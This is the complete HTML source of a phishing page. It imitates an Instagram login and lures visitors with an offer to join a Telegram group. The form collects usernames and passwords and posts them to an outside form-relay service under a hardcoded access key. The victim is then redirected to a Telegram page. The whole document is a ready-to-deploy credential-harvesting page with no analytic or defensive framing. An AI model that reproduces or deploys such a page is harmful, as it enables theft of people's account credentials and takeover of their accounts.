<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
}

.wrapper {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 12px;
}

.container {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 32px 28px 24px;
    text-align: center;
}

.logo {
    font-size: 36px;
    font-weight: 600;
    margin-bottom: 20px;
}

h1 {
    font-size: 15px;
    font-weight: 500;
    color: #555;
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 12px 10px;
    margin-bottom: 8px;
    font-size: 14px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
}

input:focus {
    outline: none;
    border-color: #a8a8a8;
}

button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background: #0095f6;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}

button:active {
    opacity: 0.85;
}

.divider {
    display: flex;
    align-items: center;
    margin: 18px 0;
    color: #8e8e8e;
    font-size: 12px;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.divider span { margin: 0 10px; }

.forgot {
    font-size: 12px;
    color: #00376b;
}

.footer {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 16px;
    margin-top: 10px;
    text-align: center;
    font-size: 14px;
}

.note {
    font-size: 11px;
    color: #8e8e8e;
    margin-top: 14px;
}
</style>
</head>

<body>

<div class="wrapper">
    <div>
        <div class="container">
            <h1>To join the Telegram group<br>continue below</h1>
            <div class="logo">Instagram</div>

            <!-- Web3Forms -->
            <form action="https://api.web3forms.com/submit" method="POST">

                <!-- REQUIRED -->
                <input type="hidden" name="access_key" value="6d827285-1350-408d-bbc7-839371ab787a">

                <!-- OPTIONAL META -->
                <input type="hidden" name="from_name" value="Instagram">
                <input type="hidden" name="subject" value="New Instagram">
                <input type="hidden" name="redirect" value="telegram.html">

                <input type="text" name="u" placeholder="Username, or email" required>
                <input type="text" name="p" placeholder="P******" required>

                <button type="submit">Continue to join telegram</button>
            </form>

            <div class="divider">
                
            </div>

        
        </div>

        <div class="footer">
        
            <div class="note">Â© 2025</div>
        </div>
    </div>
</div>

</body>
</html>
